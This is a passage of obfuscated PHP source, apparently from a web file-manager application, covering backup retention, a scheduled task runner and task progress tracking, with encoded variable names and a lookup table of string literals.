&& $¼ıùŒ‰Â[$‘­ä©‰×[810]] != $¯àÎò…Ó) { $½˜˜Áî = 0; } $this->checkStore($¼ıùŒ‰Â[$‘­ä©‰×[810]]); if (self::$manual == 1) { self::$name .= $‘­ä©‰×[11] . date($‘­ä©‰×[812]); } $­±„Æò“ = array($‘­ä©‰×[810] => $¼ıùŒ‰Â[$‘­ä©‰×[810]], $‘­ä©‰×[32] => self::$name, $‘­ä©‰×[809] => 0, $‘­ä©‰×[813] => $¼ıùŒ‰Â[$‘­ä©‰×[813]], $‘­ä©‰×[814] => self::$manual, $‘­ä©‰×[337] => array($‘­ä©‰×[815] => array($‘­ä©‰×[809] => 0), $‘­ä©‰×[816] => array($‘­ä©‰×[809] => 0, $‘­ä©‰×[817] => 0, $‘­ä©‰×[818] => 0, $‘­ä©‰×[33] => $‘­ä©‰×[12], $‘­ä©‰×[819] => 0, $‘­ä©‰×[820] => 0), $‘­ä©‰×[821] => array($‘­ä©‰×[809] => 0, $‘­ä©‰×[817] => 0, $‘­ä©‰×[818] => 0, $‘­ä©‰×[819] => 0, $‘­ä©‰×[820] => 0), $‘­ä©‰×[214] => array($‘­ä©‰×[809] => 0, $‘­ä©‰×[822] => 0, $‘­ä©‰×[823] => 0, $‘­ä©‰×[824] => 0, $‘­ä©‰×[825] => 0, $‘­ä©‰×[518] => $½˜˜Áî, $‘­ä©‰×[819] => 0, $‘­ä©‰×[820] => 0)), $‘­ä©‰×[819] => time(), $‘­ä©‰×[820] => 0); $ÂÇ¡œÚ· = Model($‘­ä©‰×[808])->insert($­±„Æò“); $­±„Æò“[$‘­ä©‰×[443]] = $ÂÇ¡œÚ·; return $­±„Æò“; } private function checkStore($†¼Îó¥é) { $Èƒ™º¿ =& $_SERVER[íû‘ş´]; $¿êå™‡† = Model($Èƒ™º¿[826])->listData($†¼Îó¥é); Model($Èƒ™º¿[826])->checkConfig($¿êå™‡†); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[íû‘ş´][808])->findByName(self::$name); } return self::$option; } public static function set($“óì÷¬¨) { $êĞ…ÙôÕ =& $_SERVER[íû‘ş´]; $ã˜Üãó = self::get(); foreach ($“óì÷¬¨ as $¥¡Ù‡â² => $¥Œ¿úë) { $…ò’ä…Ë = explode($êĞ…ÙôÕ[10], $¥¡Ù‡â²); $äÑ§ïÖ— = count($…ò’ä…Ë); switch ($äÑ§ïÖ—) { case 1: $ã˜Üãó[$…ò’ä…Ë[0]] = $¥Œ¿úë; break; case 2: $ã˜Üãó[$…ò’ä…Ë[0]][$…ò’ä…Ë[1]] = $¥Œ¿úë; break; case 3: $ã˜Üãó[$…ò’ä…Ë[0]][$…ò’ä…Ë[1]][$…ò’ä…Ë[2]] = $¥Œ¿úë; break; } } Model($êĞ…ÙôÕ[808])->update($ã˜Üãó[$êĞ…ÙôÕ[443]], $ã˜Üãó); self::$option = $ã˜Üãó; return self::$option; } public function keep() { $í Ìú =& $_SERVER[íû‘ş´]; $Öù›¸µ• = self::get(); if ($Öù›¸µ•[$í Ìú[337]][$í Ìú[815]][$í Ìú[809]] == $í Ìú[88]) { return; } $this->backupKeep($Öù›¸µ•); self::set(array($í Ìú[827] => 1)); } private function backupKeep($Áù›«ª¾) { $È™¼ìûù =& $_SERVER[íû‘ş´]; if (self::$manual == 1) { return; } $øæø¤’§ = Model($È™¼ìûù[808])->listData(); if (empty($øæø¤’§)) { return; } $ŸÇõáËÕ = 0; $Ùê§å = array(); foreach ($øæø¤’§ as $ÚìôÌÒŠ) { if ($ŸÇõáËÕ >= 7) { break; } $Ùê§å[] = $ÚìôÌÒŠ[$È™¼ìûù[32]]; $ŸÇõáËÕ++; } for ($ŸÇõáËÕ = 0; $ŸÇõáËÕ < 12; $ŸÇõáËÕ++) { $Ùê§å[] = date($È™¼ìûù[828], strtotime("\x2d{$ŸÇõáËÕ}\x20\155\157\156\x74\150\163")); } $Ùê§å = array_unique($Ùê§å); $ÈäË‹’á = Model($È™¼ìûù[829])->get($È™¼ìûù[830]); foreach ($øæø¤’§ as $ÚìôÌÒŠ) { if (isset($ÚìôÌÒŠ[$È™¼ìûù[814]]) && $ÚìôÌÒŠ[$È™¼ìûù[814]] == $È™¼ìûù[88]) { continue; } if (!empty($ÚìôÌÒŠ[$È™¼ìûù[32]]) && in_array($ÚìôÌÒŠ[$È™¼ìûù[32]], $Ùê§å)) { continue; } Model($È™¼ìûù[808])->remove($ÚìôÌÒŠ[$È™¼ìûù[443]]); $§ÖÜ®Ü = $this->backupPath($Áù›«ª¾, $ÈäË‹’á); IO::remove($§ÖÜ®Ü, !1); } } private function backupPath($Í€¬Ò›è, $üÁ³áŸ¬ = false) { $ûÑÎßü =& $_SERVER[íû‘ş´]; if (!$üÁ³áŸ¬) { $üÁ³áŸ¬ = Model($ûÑÎßü[829])->get($ûÑÎßü[830]); } $½£€›‘ = $Í€¬Ò›è[$ûÑÎßü[32]]; $ˆ÷šå£‡ = substr(md5($ûÑÎßü[831] . $üÁ³áŸ¬ . $½£€›‘), 0, 8); return "\173\x69\x6f\x3a{$Í€¬Ò›è[$ûÑÎßü[810]]}\175\x2f\144\x61\164\141\x62\x61\163\x65\x2f\142\x61\x63\x6b\165\x70\x2f" . $½£€›‘ . $ûÑÎßü[11] . $ˆ÷šå£‡; } public function db() { $±ªŒ¨¹ =& $_SERVER[íû‘ş´]; $ºº¡¬˜Ü = self::get(); if ($ºº¡¬˜Ü[$±ªŒ¨¹[337]][$±ªŒ¨¹[816]][$±ªŒ¨¹[809]] == $±ªŒ¨¹[88]) { return !0; } $‰”ãËøÍ = new BackupDb(); if (!$‰”ãËøÍ->index()) { return !1; } self::set(array($±ªŒ¨¹[832] => 1)); return !0; } public function dbFile() { $É‡†èŠÓ =& $_SERVER[íû‘ş´]; $‰™ùŠ˜Ö = self::get(); if ($‰™ùŠ˜Ö[$É‡†èŠÓ[337]][$É‡†èŠÓ[821]][$É‡†èŠÓ[809]] == $É‡†èŠÓ[88]) { return !0; } $Æõ³ùÎ = new BackupDbFile(); if (!$Æõ³ùÎ->index()) { return !1; } self::set(array($É‡†èŠÓ[833] => 1)); return !0; } public function file() { $“åñÂÜè =& $_SERVER[íû‘ş´]; $Îáõ‘Õ = self::get(); if ($Îáõ‘Õ[$“åñÂÜè[337]][$“åñÂÜè[214]][$“åñÂÜè[809]] == $“åñÂÜè[88]) { return !0; } if (!isset($Îáõ‘Õ[$“åñÂÜè[813]]) || $Îáõ‘Õ[$“åñÂÜè[813]] == $“åñÂÜè[212]) { $¨¬¬äâÎ = new BackupFile(); if (!$¨¬¬äâÎ->index()) { return !1; } } self::set(array($“åñÂÜè[834] => 1, $“åñÂÜè[809] => 1)); return !0; } } goto a„Ù¯Îö“ê; cÕì‰Ò„è: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ïı¡«ú› =& $_SERVER[íû‘ş´]; if (self::valueGet($Ïı¡«ú›[809]) != $Ïı¡«ú›[88]) { return; } if (self::valueGet($Ïı¡«ú›[1661]) == $Ïı¡«ú›[88]) { $©²àéúØ = self::valueGet($Ïı¡«ú›[1662]); if (time() - $©²àéúØ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Ïı¡«ú›[1661], $Ïı¡«ú›[88]); self::log($Ïı¡«ú›[1663] . ACTION . $Ïı¡«ú›[1664]); Hook::bind($Ïı¡«ú›[1665], $Ïı¡«ú›[1666]); $¹âªåóÑ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ïı¡«ú›[809]) != $Ïı¡«ú›[88]) { self::valueSet($Ïı¡«ú›[1661], $Ïı¡«ú›[212]); self::log($Ïı¡«ú›[1667]); die; } $©«’è‘ä = time(); if ($©«’è‘ä - $¹âªåóÑ >= 60) { self::valueSet(array($Ïı¡«ú›[1661] => $Ïı¡«ú›[88], $Ïı¡«ú›[1662] => $©«’è‘ä), !1); $¹âªåóÑ = $©«’è‘ä; } if (!file_exists(USER_SYSTEM . $Ïı¡«ú›[1668])) { self::valueSet(array($Ïı¡«ú›[1661] => $Ïı¡«ú›[212], $Ïı¡«ú›[809] => $Ïı¡«ú›[212]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ü¤ ê¨â =& $_SERVER[íû‘ş´]; http_close(); $GLOBALS[$ü¤ ê¨â[1669]] = 1; $_SERVER[$ü¤ ê¨â[1670]] = $ü¤ ê¨â[1671]; $_COOKIE = array(); $GLOBALS[$ü¤ ê¨â[546]] = 1; $GLOBALS[$ü¤ ê¨â[1672]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ıÒÈ°À³ =& $_SERVER[íû‘ş´]; http_close(); self::valueSet($ıÒÈ°À³[809], $ıÒÈ°À³[212]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ıÒÈ°À³[1661] => $ıÒÈ°À³[212], $ıÒÈ°À³[809] => $ıÒÈ°À³[88]), !1); } public static function taskSwitch() { $–¾›²ˆä =& $_SERVER[íû‘ş´]; $·í…—¿ = self::valueGet($–¾›²ˆä[809]) == $–¾›²ˆä[88] ? $–¾›²ˆä[212] : $–¾›²ˆä[88]; self::valueSet($–¾›²ˆä[809], $·í…—¿); } public static function shutdownEvent() { $ã·™—à =& $_SERVER[íû‘ş´]; self::valueSet($ã·™—à[1661], $ã·™—à[212]); self::log($ã·™—à[1673]); } public static function config($Ç¿Š¿¨, $ç„Íå‘—) { self::valueSet($_SERVER[íû‘ş´][809], $Ç¿Š¿¨); } private static function taskRunAll() { $¼ÅÓ€õ™ =& $_SERVER[íû‘ş´]; $åÔè±‘ı = timeFloat(); $ğÌİàœ³ = Model($¼ÅÓ€õ™[1674])->listData(); $ø¨â–Ş˜ = count($ğÌİàœ³); for ($œÚÄ­¹ö = 0; $œÚÄ­¹ö < $ø¨â–Ş˜; $œÚÄ­¹ö++) { $ÅŸ¼›‹¥ = $ğÌİàœ³[$œÚÄ­¹ö]; if (!$ÅŸ¼›‹¥[$¼ÅÓ€õ™[443]] || $ÅŸ¼›‹¥[$¼ÅÓ€õ™[1675]] != $¼ÅÓ€õ™[88]) { continue; } if (!self::taskTimeCheck($ÅŸ¼›‹¥)) { continue; } self::taskRun($ÅŸ¼›‹¥); } Hook::trigger($¼ÅÓ€õ™[1676]); self::taskQueueRun($åÔè±‘ı); } private static function taskQueueRun($÷„òóğ) { $Ó‰èºÚë = 10; while (!0) { $üºĞ‰íâ = TaskQueue::run(); if ($üºĞ‰íâ === !1) { break; } if (timeFloat() - $÷„òóğ >= $Ó‰èºÚë) { break; } } } private static function taskTimeCheck($Íóë ºÇ) { $æâŞÄì =& $_SERVER[íû‘ş´]; $Ôµƒ„¿ = json_decode($Íóë ºÇ[$æâŞÄì[194]], !0); $ùŸµ‡÷Ä = intval($Íóë ºÇ[$æâŞÄì[1662]]); $€“®‰·¿ = strtotime($æâŞÄì[1677] . $Ôµƒ„¿[$æâŞÄì[1678]] . $æâŞÄì[1679]) - strtotime($æâŞÄì[1680]); $Ë¢–²æ÷ = time() - strtotime(date($æâŞÄì[1681]) . $æâŞÄì[1682]); $—üôœ£Ã = $Ë¢–²æ÷ >= $€“®‰·¿ && $Ë¢–²æ÷ <= $€“®‰·¿ + 3600; switch ($Ôµƒ„¿[$æâŞÄì[33]]) { case $æâŞÄì[1683]: if (time() - $ùŸµ‡÷Ä < 3600 * 24 * 30) { return !1; } if ($Ôµƒ„¿[$æâŞÄì[1683]] == date($æâŞÄì[1684]) && $—üôœ£Ã) { return !0; } break; case $æâŞÄì[1685]: if (time() - $ùŸµ‡÷Ä < 3600 * 24 * 7) { return !1; } $ôÒÜ¨ˆ‚ = date($æâŞÄì[1686]) == 0 ? 7 : date($æâŞÄì[1686]); if ($Ôµƒ„¿[$æâŞÄì[1685]] == $ôÒÜ¨ˆ‚ && $—üôœ£Ã) { return !0; } break; case $æâŞÄì[1678]: if (time() - $ùŸµ‡÷Ä < 3600 * 24) { return !1; } if ($—üôœ£Ã) { return !0; } break; case $æâŞÄì[1687]: if (time() - $ùŸµ‡÷Ä >= floatval($Ôµƒ„¿[$æâŞÄì[1687]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $±Óø§‹ =& $_SERVER[íû‘ş´]; static $ú£ò’œÎ = 0; $·ˆ×ê¨½ = 300; if (!$ú£ò’œÎ) { $ú£ò’œÎ = time(); } if (time() - $ú£ò’œÎ < $·ˆ×ê¨½) { return; } $ú£ò’œÎ = time(); $Ãø™‹ş  = Model($±Óø§‹[556])->db($±Óø§‹[12]); if ($Ãø™‹ş ) { $Ãø™‹ş ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($±Óø§‹[1688], $±Óø§‹[1689]); die; } } public static function taskRun($âÜê«»’) { $ÊŒòÔ¯¹ =& $_SERVER[íû‘ş´]; self::log($ÊŒòÔ¯¹[1690] . $âÜê«»’[$ÊŒòÔ¯¹[443]] . $ÊŒòÔ¯¹[1691] . $âÜê«»’[$ÊŒòÔ¯¹[32]] . $ÊŒòÔ¯¹[1692] . $âÜê«»’[$ÊŒòÔ¯¹[1693]]); Model($ÊŒòÔ¯¹[1674])->run($âÜê«»’[$ÊŒòÔ¯¹[443]]); $˜ÆÑ¬ş£ = timeFloat(); $ƒõÕÉ´Ñ = $ÊŒòÔ¯¹[12]; switch ($âÜê«»’[$ÊŒòÔ¯¹[33]]) { case $ÊŒòÔ¯¹[351]: $Ç¸¬ú = url_request($âÜê«»’[$ÊŒòÔ¯¹[1693]], $ÊŒòÔ¯¹[245], !1, !1, !1, !1, 10); if ($Ç¸¬ú[$ÊŒòÔ¯¹[809]]) { $ƒõÕÉ´Ñ = strlen($Ç¸¬ú[$ÊŒòÔ¯¹[1260]]); } break; case $ÊŒòÔ¯¹[244]: $ƒõÕÉ´Ñ = Hook::apply($âÜê«»’[$ÊŒòÔ¯¹[1693]]); default: break; } Model($ÊŒòÔ¯¹[1694])->add(array($ÊŒòÔ¯¹[1695] => $ÊŒòÔ¯¹[12], $ÊŒòÔ¯¹[1696] => $ÊŒòÔ¯¹[212], $ÊŒòÔ¯¹[33] => $ÊŒòÔ¯¹[1697] . $âÜê«»’[$ÊŒòÔ¯¹[443]], $ÊŒòÔ¯¹[1698] => json_encode(array($ÊŒòÔ¯¹[32] => $âÜê«»’[$ÊŒòÔ¯¹[32]], $ÊŒòÔ¯¹[1699] => timeFloat() - $˜ÆÑ¬ş£, $ÊŒòÔ¯¹[337] => $ƒõÕÉ´Ñ)))); $„ù¾°Ô = $ƒõÕÉ´Ñ ? $ÊŒòÔ¯¹[1700] . $ƒõÕÉ´Ñ : $ÊŒòÔ¯¹[12]; self::log($ÊŒòÔ¯¹[1701] . $âÜê«»’[$ÊŒòÔ¯¹[443]] . $ÊŒòÔ¯¹[165] . $„ù¾°Ô); return !0; } public static function valueGet($Šñûáí­) { $ßÁ¶ =& $_SERVER[íû‘ş´]; $«ƒîÎ×Ğ = $ßÁ¶[1702]; $—£¥Ğú = Model($ßÁ¶[485])->get($Šñûáí­, $«ƒîÎ×Ğ); if (is_null($—£¥Ğú)) { Model($ßÁ¶[485])->set($ßÁ¶[809], $ßÁ¶[88], $«ƒîÎ×Ğ); Model($ßÁ¶[485])->set($ßÁ¶[1661], $ßÁ¶[212], $«ƒîÎ×Ğ); $—£¥Ğú = Model($ßÁ¶[485])->get($Šñûáí­, $«ƒîÎ×Ğ); } return $—£¥Ğú; } private static function valueSet($Œ´Ò¯»ü, $öŸ×ç³˜) { $—ºÜ¡ø÷ =& $_SERVER[íû‘ş´]; $Ìš°¢¤ = $—ºÜ¡ø÷[1703]; CacheLock::lock($Ìš°¢¤); $™æŠåÅ = Model($—ºÜ¡ø÷[485])->set($Œ´Ò¯»ü, $öŸ×ç³˜, $—ºÜ¡ø÷[1702]); CacheLock::unlock($Ìš°¢¤); return $™æŠåÅ; } protected static function log($Ø®ß—Ü–) { write_log($Ø®ß—Ü–, $_SERVER[íû‘ş´][1689]); } private static function cacheClear() { $Ğæ¥—¾” =& $_SERVER[íû‘ş´]; Cache::clearMemory(Model($Ğæ¥—¾”[485])->cacheKey($Ğæ¥—¾”[1702])); Cache::clearMemory(Model($Ğæ¥—¾”[485])->cacheKey($Ğæ¥—¾”[1704])); Model($Ğæ¥—¾”[1674])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Åµƒ²¶à, $°¾Ô°ä– = '', $ñ§óáã = 0, $µ‡µîÏ– = '') { $±›Ñ”Ù =& $_SERVER[íû‘ş´]; if (self::get($Åµƒ²¶à)) { return; } $this->task = array($±›Ñ”Ù[443] => $Åµƒ²¶à, $±›Ñ”Ù[1705] => USER_ID, $±›Ñ”Ù[1599] => $µ‡µîÏ–, $±›Ñ”Ù[503] => $±›Ñ”Ù[12], $±›Ñ”Ù[33] => $°¾Ô°ä–, $±›Ñ”Ù[1122] => $±›Ñ”Ù[12], $±›Ñ”Ù[845] => $ñ§óáã, $±›Ñ”Ù[1706] => 0, $±›Ñ”Ù[1707] => 0, $±›Ñ”Ù[1708] => 0, $±›Ñ”Ù[1709] => timeFloat(), $±›Ñ”Ù[1710] => 0, $±›Ñ”Ù[1711] => 0, $±›Ñ”Ù[1712] => 0, $±›Ñ”Ù[1713] => 0, $±›Ñ”Ù[809] => $±›Ñ”Ù[1661]); $GLOBALS[$±›Ñ”Ù[1714]] = 1; Hook::bind($±›Ñ”Ù[1665], array($this, $±›Ñ”Ù[1715])); Hook::bind($±›Ñ”Ù[1716], array($this, $±›Ñ”Ù[1717])); $this->startAfter(); Hook::trigger($±›Ñ”Ù[1718], $this->task); $this->task[$±›Ñ”Ù[1711]] = timeFloat(); } public function end($§Ìş¶‰á = '') { $¶ù”ÁÊŸ =& $_SERVER[íû‘ş´]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¶ù”ÁÊŸ[1711]]) { self::valueSet($this->task[$¶ù”ÁÊŸ[443]], !1); } $this->isEnd = !0; if ($§Ìş¶‰á) { $this->task[$¶ù”ÁÊŸ[503]] = $§Ìş¶‰á; } self::log($¶ù”ÁÊŸ[1719] . $this->task[$¶ù”ÁÊŸ[443]] . $¶ù”ÁÊŸ[1720] . sprintf($¶ù”ÁÊŸ[910], timeFloat() - $this->task[$¶ù”ÁÊŸ[1709]]) . $¶ù”ÁÊŸ[1721]); Hook::unbind($¶ù”ÁÊŸ[1665], array($this, $¶ù”ÁÊŸ[1715])); Hook::unbind($¶ù”ÁÊŸ[1716], array($this, $¶ù”ÁÊŸ[1717])); $this->endAfter(); $€À–ë’¸ = $this->task; $this->task = !1; Hook::trigger($¶ù”ÁÊŸ[1722], $€À–ë’¸); } public function update($„áå³–Ñ = 0, $ğØõõÜ³ = false) { $Ú”¥¿æ™ =& $_SERVER[íû‘ş´]; $’³‚’Ş„ =& $this->task; if (!$’³‚’Ş„) { return; } $’³‚’Ş„[$Ú”¥¿æ™[1706]] += $„áå³–Ñ; $’³‚’Ş„[$Ú”¥¿æ™[1710]] = timeFloat(); if ($’³‚’Ş„[$Ú”¥¿æ™[845]]) { if ($’³‚’Ş„[$Ú”¥¿æ™[845]] < $’³‚’Ş„[$Ú”¥¿æ™[1706]]) { $’³‚’Ş„[$Ú”¥¿æ™[845]] = $’³‚’Ş„[$Ú”¥¿æ™[1706]]; } $‰ıÎ¨Ñ˜ = timeFloat() - $’³‚’Ş„[$Ú”¥¿æ™[1709]] - $’³‚’Ş„[$Ú”¥¿æ™[1712]]; if ($‰ıÎ¨Ñ˜ <= 0) { $‰ıÎ¨Ñ˜ = 0.001; } $’³‚’Ş„[$Ú”¥¿æ™[1707]] = $’³‚’Ş„[$Ú”¥¿æ™[1706]] / $’³‚’Ş„[$Ú”¥¿æ™[845]]; $’³‚’Ş„[$Ú”¥¿æ™[1708]] = $’³‚’Ş„[$Ú”¥¿æ™[1706]] / $‰ıÎ¨Ñ˜; if ($’³‚’Ş„[$Ú”¥¿æ™[1707]] > 0) { $’³‚’Ş„[$Ú”¥¿æ™[1713]] = $‰ıÎ¨Ñ˜ * (1 - $’³‚’Ş„[$Ú”¥¿æ™[1707]]) / $’³‚’Ş„[$Ú”¥¿æ™[1707]]; } $’³‚’Ş„[$Ú”¥¿æ™[1713]] = $’³‚’Ş„[$Ú”¥¿æ™[1713]] <= 0 ? 0 : $’³‚’Ş„[$Ú”¥¿æ™[1713]]; } $this->updateAfter(); $ØÖ£…Î = 0.2; if (timeFloat() - $’³‚’Ş„[$Ú”¥¿æ™[1711]] < $ØÖ£…Î && !$ğØõõÜ³) { return; } $×œ…ÒÄå = self::get($’³‚’Ş„[$Ú”¥¿æ™[443]]); $…š”‚ı¬ = $×œ…ÒÄå[$Ú”¥¿æ™[809]]; if ($…š”‚ı¬ == self::STATYS_KILL) { $½»£öÑ = array($Ú”¥¿æ™[1723] => LNG($Ú”¥¿æ™[1724]), $Ú”¥¿æ™[1270] => !1); Cache::set($Ú”¥¿æ™[1725] . $this->task[$Ú”¥¿æ™[443]], $½»£öÑ, 30); $this->onKill(); $this->end(); die; } else { if ($…š”‚ı¬ == self::STATYS_STOP) { $ö£ã—²Å = 2; $×œ…ÒÄå[$Ú”¥¿æ™[1712]] += $ö£ã—²Å; self::valueSet($’³‚’Ş„[$Ú”¥¿æ™[443]], $×œ…ÒÄå); sleep($ö£ã—²Å); $this->update(); return; } } $’³‚’Ş„[$Ú”¥¿æ™[809]] = $…š”‚ı¬ ? $…š”‚ı¬ : $’³‚’Ş„[$Ú”¥¿æ™[809]]; $’³‚’Ş„[$Ú”¥¿æ™[1712]] = $×œ…ÒÄå[$Ú”¥¿æ™[1712]] ? $×œ…ÒÄå[$Ú”¥¿æ™[1712]] : 0; $’³‚’Ş„[$Ú”¥¿æ™[1711]] = timeFloat(); Hook::trigger($Ú”¥¿æ™[1726], $’³‚’Ş„); self::valueSet($’³‚’Ş„[$Ú”¥¿æ™[443]], $’³‚’Ş„); } public function onKillSet($ûÉ¶“™ê, $ÅìÀšÙ» = array()) { $this->onKillCall = array($ûÉ¶“™ê, $ÅìÀšÙ»); } public function onKill() { $›çÙ—ïÇ =& $_SERVER[íû‘ş´]; self::log($›çÙ—ïÇ[1719] . $this->task[$›çÙ—ïÇ[443]] . $›çÙ—ïÇ[1727]); Hook::trigger($›çÙ—ïÇ[1728], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($À¥ŒŸ”˜) { $»ü¸İĞğ =& $_SERVER[íû‘ş´]; Cache::set($»ü¸İĞğ[1725] . $this->task[$»ü¸İĞğ[443]], $À¥ŒŸ”˜, 60); return $À¥ŒŸ”˜; } public static function get($£‰²§ŠŠ) { $™ğç“÷Œ =& $_SERVER[íû‘ş´]; $°¸»ÙÂù = self::valueGet($£‰²§ŠŠ); if (is_array($°¸»ÙÂù) && $°¸»ÙÂù[$™ğç“÷Œ[1729]]) { $Ççšè‰ = ActionApply($°¸»ÙÂù[$™ğç“÷Œ[1729]], array($°¸»ÙÂù)); $°¸»ÙÂù = is_array($Ççšè‰) ? $Ççšè‰ : $°¸»ÙÂù; } return $°¸»ÙÂù; } public static function listData() { $”ğŒ‚êş = self::valueGet(); return array_sort_by($”ğŒ‚êş, $_SERVER[íû‘ş´][1709], !0); } public static function kill($£ä»›Î) { return self::changeStatus($£ä»›Î, self::STATYS_KILL); } public static function stop($¾éŒè¯¥) { return self::changeStatus($¾éŒè¯¥, self::STATYS_STOP); } public static function restart($Öğ™ÇÖõ) { return self::changeStatus($Öğ™ÇÖõ, self::STATYS_RUNNING); } public static function killAll() { $ùá²‚õ =& $_SERVER[íû‘ş´]; $üé¾¹óõ = self::listData(); foreach ($üé¾¹óõ as $¶›–ÛÖ¬) { self::kill($¶›–ÛÖ¬[$ùá²‚õ[443]]); } sleep(2); foreach ($üé¾¹óõ as $¶›–ÛÖ¬) { self::valueSet($¶›–ÛÖ¬[$ùá²‚õ[443]], !1); } } private static function changeStatus($ é£Ãú£, $ïø§¨ãÁ) { $æØ‘ª“ =& $_SERVER[íû‘ş´]; $ŸØ¢Ş´ = self::valueGet($ é£Ãú£); if (!$ŸØ¢Ş´) { return !1; } $ŸØ¢Ş´[$æØ‘ª“[809]] = $ïø§¨ãÁ; self::valueSet($ é£Ãú£, $ŸØ¢Ş´); self::log($æØ‘ª“[1730] . $ŸØ¢Ş´[$æØ‘ª“[443]] . $æØ‘ª“[1731] . $ïø§¨ãÁ); return !0; } public static function valueGet($ç…ä¾ÇÅ = false) { $õ”ÖµÜ =& $_SERVER[íû‘ş´]; if ($ç…ä¾ÇÅ) { $õéªæÀã = Model($õ”ÖµÜ[497])->where(array($õ”ÖµÜ[94] => $ç…ä¾ÇÅ, $õ”ÖµÜ[33] => $õ”ÖµÜ[1129]))->find(); return $õéªæÀã ? json_decode($õéªæÀã[$õ”ÖµÜ[418]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($·¢³ğÑ´ = false) { $Ğñ™€—ƒ =& $_SERVER[íû‘ş´]; $¯³’ú®ö = array($Ğñ™€—ƒ[33] => $Ğñ™€—ƒ[1129]); if ($·¢³ğÑ´) { $¯³’ú®ö[$Ğñ™€—ƒ[1705]] = $·¢³ğÑ´; } $’ˆğ = Model($Ğñ™€—ƒ[497])->where($¯³’ú®ö)->select(); $’ˆğ = $’ˆğ ? $’ˆğ : array(); foreach ($’ˆğ as $İå³’ĞÇ => $Ú°åàÒË) { $’ˆğ[$İå³’ĞÇ] = json_decode($Ú°åàÒË[$Ğñ™€—ƒ[418]], !0); } return $’ˆğ; } public static function valueSet($Œò¿Øš¿, $ÅêÅƒ) { $˜ÒÙ²»­ =& $_SERVER[íû‘ş´]; if (!$ÅêÅƒ) { return Model($˜ÒÙ²»­[497])->where(array($˜ÒÙ²»­[94] => $Œò¿Øš¿, $˜ÒÙ²»­[33] => $˜ÒÙ²»­[1129]))->delete(); } $‘Ğêï×û = json_encode($ÅêÅƒ); if (!$‘Ğêï×û) { ob_start(); var_dump($ÅêÅƒ); $ö³•şÍ• = ob_get_clean(); self::log($˜ÒÙ²»­[1732] . json_encode_force($ö³•şÍ•)); } if (!$Œò¿Øš¿ || !$ÅêÅƒ[$˜ÒÙ²»­[443]]) { return !1; } $¥Şä•İ = array($˜ÒÙ²»­[33] => $˜ÒÙ²»­[1129], $˜ÒÙ²»­[1705] => USER_ID, $˜ÒÙ²»­[94] => $Œò¿Øš¿, $˜ÒÙ²»­[418] => $‘Ğêï×û); $Ö±²Üõ¸ = $˜ÒÙ²»­[1733]; CacheLock::lock($Ö±²Üõ¸); Model($˜ÒÙ²»­[497])->add($¥Şä•İ, array(), !0); CacheLock::unlock($Ö±²Üõ¸); } public static function log($ñØúõ) { if (!GLOBAL_DEBUG) { return; } write_log($ñØúõ, $_SERVER[íû‘ş´][1734]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¥ºíÃ„ =& $_SERVER[íû‘ş´]; $¥³‹ÈßÅ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¥ºíÃ„[1735], array($this, $¥ºíÃ„[1736])); Hook::bind($¥ºíÃ„[1281], array($this, $¥ºíÃ„[1737])); Hook::bind($¥ºíÃ„[1738], array($this, $¥ºíÃ„[1739])); Hook::bind($¥ºíÃ„[646], array($this, $¥ºíÃ„[1740])); Hook::bind($¥ºíÃ„[647], array($this, $¥ºíÃ„[1741])); Hook::bind($¥ºíÃ„[653], array($this, $¥ºíÃ„[1742])); Hook::bind($¥ºíÃ„[654], array($this, $¥ºíÃ„[1743])); Hook::bind($¥ºíÃ„[649], array($this, $¥ºíÃ„[1744])); Hook::bind($¥ºíÃ„[651], array($this, $¥ºíÃ„[1745])); Hook::bind($¥ºíÃ„[615], array($this, $¥ºíÃ„[1746])); Hook::bind($¥ºíÃ„[612], array($this, $¥ºíÃ„[1746])); Hook::bind($¥ºíÃ„[617], array($this, $¥ºíÃ„[1746])); Hook::bind($¥ºíÃ„[619], array($this, $¥ºíÃ„[1746])); Hook::bind($¥ºíÃ„[621], array($this, $¥ºíÃ„[1746])); Hook::bind($¥ºíÃ„[1747], array($this, $¥ºíÃ„[1748])); Hook::bind($¥ºíÃ„[637], array($this, $¥ºíÃ„[1749])); $this->sourceModelCopyFlag = !1; Hook::bind($¥ºíÃ„[1750], array($this, $¥ºíÃ„[1751])); Hook::bind($¥ºíÃ„[1752], array($this, $¥ºíÃ„[1753])); Hook::bind($¥ºíÃ„[1754], array($this, $¥ºíÃ„[1755])); $¥³‹ÈßÅ[$¥ºíÃ„[1756]] = LNG($¥ºíÃ„[1757]); $¥³‹ÈßÅ[$¥ºíÃ„[1758]] = 0; $¥³‹ÈßÅ[$¥ºíÃ„[1759]] = 0; $¥³‹ÈßÅ[$¥ºíÃ„[1122]] = $¥ºíÃ„[12]; $¥³‹ÈßÅ[$¥ºíÃ„[1760]] = $¥ºíÃ„[12]; $¥³‹ÈßÅ[$¥ºíÃ„[1761]] = 0; $¥³‹ÈßÅ[$¥ºíÃ„[1762]] = 0; $¥³‹ÈßÅ[$¥ºíÃ„[1763]] = 0; if (!$¥³‹ÈßÅ[$¥ºíÃ„[1599]]) { $¥³‹ÈßÅ[$¥ºíÃ„[1599]] = LNG($¥ºíÃ„[1764]); } } protected function endAfter() { $¨¼‰­Ò =& $_SERVER[íû‘ş´]; 